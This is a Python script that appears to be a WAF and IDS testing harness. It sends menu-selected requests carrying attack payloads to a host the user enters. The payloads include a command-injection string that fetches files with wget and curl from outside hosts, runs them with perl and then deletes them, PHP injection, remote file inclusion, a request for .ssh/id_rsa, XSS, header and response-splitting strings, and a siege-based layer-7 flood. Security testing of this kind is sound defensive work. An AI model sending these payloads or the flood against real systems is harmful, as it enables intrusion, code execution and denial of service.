import requests
import os

host=input('Please enter Host URL: Example https://my.fqdn.com: ')
if "https://" not in host:
    host = "https://" + host
port = input('Enter custom port or press Enter for HTTPS')
if port != "":
    port = input('Enter Port:')
    host= host+":"+port

timeout = 5

testcases = {
        1:{"category":"waf","name":"phpinject1-933100","method":"get","url":"/?foo=%5C%3C?exec%5C(%E2%80%99wget%20http://r57.biz/r57.txt%20-O","header":"","data":""},
        2:{"category":"waf","name":"phpinject2-933120","method":"post","url":"/","header":"","data":"var=session.bug_compat_42%3dtrue"},
        3:{"category":"waf","name":"localfileexec1-930120","method":"get","url":"/","header":{'foobarheader': '0x5c0x2e.%00/'},"data":""},
        4:{"category":"waf","name":"localfileexec2-930120","method":"get","url":"/?foo=arg&path_comp=.ssh/id_rsa","header":"","data":""},
        5:{"category":"waf","name":"remotefileexec-931100","method":"get","url":"/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php","header":"","data":""},
        6:{"category":"waf","name":"remotecodeexec-932100","method":"get","url":"/?foo=system(’echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf","header":"","data":""},
        7:{"category":"waf","name":"xss-941310","method":"post","url":"/","header":"","data":"var=.*¾.*¼.*"},
        8:{"category":"waf","name":"xss2-941310","method":"get","url":"/?\'param=<scripttest>\'","header":"","data":""},
        9:{"category":"waf","name":"sqlinjection-942140","method":"get","url":"/?sql_table=pg_catalog","header":"","data":""},
        10:{"category":"waf","name":"sqlinjection2-942220","method":"get","url":"/?string_to_convert=4294967296","header":"","data":""},
        11:{"category":"waf","name":"sessionfixation-943100","method":"get","url":'/foo.php?bar=blah<script>document.cookie=\"sessionid=1234;%20domain=.example.dom\";</script>',"header":"","data":""},
        12:{"category":"waf","name":"sessionfixation2-943120","method":"get","url":"/?phpsessid=asdfdasfadsads","header":"","data":""},
        13:{"category":"waf","name":"httpheaderinjection","method":"get","url":"/?\'%0d%0aparam=test\'","header":"","data":""},
        14:{"category":"waf","name":"httpheaderinjection2-921160","method":"get","url":"/script_rule921160.jsp?variableX=bar&variable2=Y&%0d%0Remote-addr%0d%0d%0d:%20foo.bar.com","header":"","data":""},
        15:{"category":"waf","name":"av","method":"post","url":'/',"header":"","data":"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"},
        16:{"category":"waf","name":"httpresponsesplitting-921120","method":"get","url":"/file.jsp?somevar=foobar%0d%0aContent-Length:%2002343432423<html>ftw</html>","header":"","data":""},
        17:{"category":"waf","name":"httpresponsesplitting2-921120","method":"get","url":'/index.html?first=xxx<script> … </script>&lang=fr%0d%0aContent-Length:0%0d%0a HTTP/1.1%20200%20Found%0d%0aContentLength:550%0d%0a',"header":{'User-Agent': '{}s:21:'},"data":""},
        18:{"category":"ids","name":"zip","method":"get","url":"/20MB.zip","header":"","data":""},
        19:{"category":"ids","name":"pdf","method":"get","url":"/5MB.pdf","header":"","data":""},
        20:{"category":"ids","name":"solarwinds-nt1","method":"get","url":"/api/Skipi18n","header":"","data":""},
        21:{"category":"ids","name":"solarwinds-nt2","method":"get","url":"/api/WebResource.axd","header":"","data":""},
        22:{"category":"ids","name":"nt3","method":"get","url":"/index.html","header":{'User-Agent':'windows launcher v1.0.20'},"data":""},
        23:{"category":"ids","name":"nt4","method":"get","url":"/conn.php?data=callback=","header":{"User-Agent": "NeptunUran"},"data":""},
        24:{"category":"l7dos","name":"L7Dos","method":"dos","url":"/l7testvaltix.html","header":"","data":""},
        100:{"category":"All","name":"Test Cases","method":"","url":"","header":"","data":""},
        200:{"category":"Exit","name":"Test Cases","method":"","url":"","header":"","data":""},
} 

def menu(cases):
    for p_id ,p_info in cases.items():
       print ("Enter "+str(p_id)+ " for Test Case: " + p_info["category"] + " " + p_info["name"] )
    choice = input("Please Enter your Selection:")
    print ("\nSelection ="+choice)
    return int(choice)
    
def webrequest(method,url,headers,data):
    print ("in webrequest")
    if method == "get":
     print ("GET -> "+url)
     try:
         res = requests.get(url, headers=headers,timeout=timeout,verify = False)
         print ("headers:") 
         print(res)
         return res
     except: 
         print ("Connection Reset / Timeout")
    elif method == "post":
     try:
         print ("POST -> "+url+ "data:"+ data)
         res = requests.post(url, data=data,timeout=timeout,verify = False)
         print(res)
         return res
     except: 
         print ("Connection Reset / Timeout")
    elif method == "send":
     try:
         data = open(testcases[choice]["data"], "rb")
         res = requests.post(url,files = {"form_field_name": data},verify = False)
         print(res)
         return res
     except: 
         print ("Connection Reset / Timeout")
    elif method == "dos":
         cmd="siege -R ~/.siege/siege.conf -r 5000 -b "+url
         print(cmd)
         print(os.system(cmd))
         return url
#./siege -R ~/.siege/siege.conf -r 5000 -b http://valtix-l-ingresomalolvc-f856dc60f7eef929.elb.us-west-2.amazonaws.com/index.html        
def runall(cases):
    for p_id ,p_info in cases.items():
      endpoint=host+p_info["url"]
      print ("URL: "+endpoint)
      webrequest(p_info["method"],endpoint,p_info["header"],p_info["data"])
      
loop = 1
while loop == 1:
    choice = menu(testcases)
    if choice not in (100,200):
      endpoint = host + testcases[choice]["url"]
      res=webrequest(testcases[choice]["method"],endpoint,testcases[choice]["header"],testcases[choice]["data"])
    elif choice == 100:
        print ("All Test Cases\n")
        runall(testcases)
    elif choice == 200:
        print ("100 Exit")
        loop = 0
